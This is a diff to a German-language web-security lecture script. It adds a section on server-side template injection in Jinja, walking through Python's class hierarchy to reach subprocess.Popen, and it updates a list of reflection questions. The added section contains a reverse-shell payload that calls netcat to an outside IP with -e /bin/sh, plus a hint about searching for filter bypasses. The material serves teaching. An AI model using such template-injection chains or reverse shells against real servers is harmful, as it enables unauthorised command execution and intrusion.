+Natürlich ergeben sich auch Angriffsmöglichkeiten. Kann ein Angreifer ein Template modifizieren und anschließend zur Ausführung bringen, besitzt er die Möglichkeit am Server Code (innerhalb der Template-Engine) auszuführen. Nun benötigt er noch die Möglichkeit, aus dem Template-System auszubrechen und in der zugrunde liegenden Umgebung (z.B. in die Web-Applikation) Befehle auszuführen. Dies wäre dann eine Remote Command Execution (RCE).
+
+\subsection{Beispiel Template System: Jinja (Python)}
+
+Eine häufig verwendete Template Engine in Python-basierten Web-Applikationen ist Jinja\footnote{\url{https://jinja.palletsprojects.com/}}. In einem Template werden primär zwei verschiedene Kommando-Tags zum Inkludieren von Daten bzw. Kommandos verwendet:
+
+\begin{minted}{html}
+<ul>
+	{% for item in somelist %}
+	  <li> {{ item }} </li>
+	{% endfor %}
+</ul>
+\end{minted}
+
+Dieses Jinja/HTML-Fragment baut eine Aufzählungsliste (mittels dem ul-Tag). Es verwendet Template-Tags um eine Python-for-Schleife zu inkludieren. Diese Schleife iteriert über die somelist Liste und inkludiert jedes Item in einem li-Element.
+
+\subsection{Exploitation}
+
+In einem typischen Szenario hat der Angreifer bereits Zugriff auf ein System erlangt und kann sowohl ein Template bearbeiten als auch ausführen. Dies kann z.B. durch Erlangen eines CMS-Autor-Accounts innerhalb der Weboberfläche geschehen. Innerhalb dieser Oberfläche kann der Angreifer ein Template (z.B. für versendete Emails) modifizieren als auch, z.B. als ,,Preview'', anzeigen (und dadurch das Template zur Exekution bringen).
+
+Der Angreifer verwendet hierfür z.B. die gezeigen \{\{ \ldots \}\} Tags. Er besitzt allerdings nur Zugriff auf Objekte, welche in das Template vom System hinein übergeben wurden. Bei unserem Beispiel wäre dies die Liste somelist. Hier kann er allerdings das Python-Typsystem ausnutzen um Zugriff auf weitere Objekte zu erlangen. Schlussendlich will der Angreifer zu einem Objekt bzw. zu einer Klasse gelanten, welche ihm die Ausführung von Code am Server erlaubt.
+
+In Python kann über das Attribut \_\_class\_\_ auf die Klasse eines Objekts zugegriffen werden, die Methode mro liefert sowohl die eigene Klasse als auch alle Elternklassen eines Objektes:
+
+\begin{minted}{python}
+somelist = [1,2,3]
+somelist.__class__         # -> <type 'list'>
+somelist.__class__.mro()   # -> [<type 'list'>, <type 'object'>]
+obj_class = somelist.__class__.mro()[1]
+\end{minted}
+
+Somit erhaltne wir über ,,somelist.\_\_class\_\_.mro()'' alle Klassen (inklusive vererbter Klassen) des Objekts ,,somelist''. In Python erben alle Klassen von der Elternklasse ,,Object'' welche wir über die Array-Position 1 selektieren und der Variablen ,,obj\_class'' zuweisen. Klassen in Python besitzen die Methode ,,\_\_subclasses\_\_'' welche eine Liste von allen aktuell bekannten Subklassen zurück liefert. Diese Liste ist dynamisch sowohl die Elemente, als auch die Reihung jener, kann zur Laufzeit variieren.
+
+Ein Angreifer kann diese Liste ausgeben und eine potentiell verwundbare Klasse, wie z.B. ,,subprocess.Popen'' suchen und über den Index diese Klasse selektionen. Nehmen wir an, dass diese Klasse in unserem Beispiel auf Array Position 42 vorhandne war. Durch Hinzufügen von ,,()'' wird nun der Konstruktor der Klasse aufgerufen, hierbei können Parameter angegeben werden. Bei ,,Popen'' kann ein Array mit Parametern übergeben werden. Diese werden zusammenkopiert und beim Aufruf des Konstruktors als Systemkommando ausgeführt:
+
+\begin{minted}{python}
+obj_class = somelist.__class__.mro()[1]
+obj_class.__subclasses__()[42]   # -> <class 'subprocess.Popen'>
+obj_class.__subclasses__[42](["nc", "10.0.0.1", "443", "-e", "/bin/sh"])
+\end{minted}
+
+Bei diesem Beispiel wird somit als Kommando ,,ns 10.0.0.1 443 -e /bin/sh'' aufgerufen: dieses Kommando baut eine reverse-shell auf, ein Angreifer erhält auf diese Weise Shell-Zugriff auf den Server mit den Rechten der Web-Applikation.
+
+Webapplikationen versuchen häufig, Benutzereingaben in Templates auf Schadcode hin zu überprüfen. Dies ist problematisch da Templates viele Möglichkeiten bieten, Schadcode zu verschleiern und auf diese Weise Absicherungen zu umgehen\footnote{siehe auch \url{https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/}}. Als Angreifer sucht man in diesem Fall am Besten nach ,,bypass'' und dem Namen der verwendeten Template-Engine.
+
+Ein Exploit gegen ein Template-System kann selten zu 100\% statisch erfolgen da die Liste der Subklassen von ,,Object'' dynamisch ist: sowohl die Elemente als auch deren Position ist von der Laufzeitumgebung abhängig und kann sich bei jedem Start der Webapplikation verändern. Ein Angreifer wird daher zumeist mehrstufig vorgehen und nach Erlangen des Zugriffs auf das CMS initial versuchen aussichtsreiche Objekt-Klassen und deren Position (im Subklassen-Array) zu identifizieren. Anschließend wird er versuchen, erfolgversprechende Klassen zu instanzieren und auf diese Weise Schadcode auszuführen.
+
 \section{Reflektionsfragen}
 
 \begin{enumerate}
 	\item Wie funktioniert eine SQL union-based Injection? Womit können SQL-Injections vermieden werden?
 	\item Wie funktioniert eine SQL time-based Injection? Womit können SQL-Injections vermieden werden?
-	\item Was sollte bei der Verwendung von WebSockets beachtet werden?
 	\item Warum sollten SQL prepared statements verwendet werden?
 	\item Was versteht man unter einer Serialisierungs-Schwachstelle? Welche negativen Auswirkungen können Serialisierungsangriffe auf eine Applikation besitzen?
 	\item Was versteht man unter XML External Entity Attacks? Welche negativen Auswirkungen auf die Applikation können erzielt werden und welche Gegenmaßnahmen sind möglich?
 	\item Welche Probleme können beim Upload eines Files auf einen Webserver auftreten? Welche Best-Practises im Zusammenhang mit File-Uploads sollten beachtet werden?
 	\item Unterschied der Angriffsvektoren mit einem File, dass serverseitig exekutierten Code enthält und einem File, dass client-seitig exekutierten Code enthält?
+	\item Wie können Path-Traversal Angriffe eingesetzt werden?
+	\item Erläutere LDAP-Injections.
+	\item Welche Schwachstelle wird bei Type-Juggling Angriffen ausgenutzt? Erläutere ein solches Beispiel.
+	\item Was versteht man unter HTTP Request Smuggling?
+	\item Erläutere Server-Side Template Injection (SSTI).
 \end{enumerate}
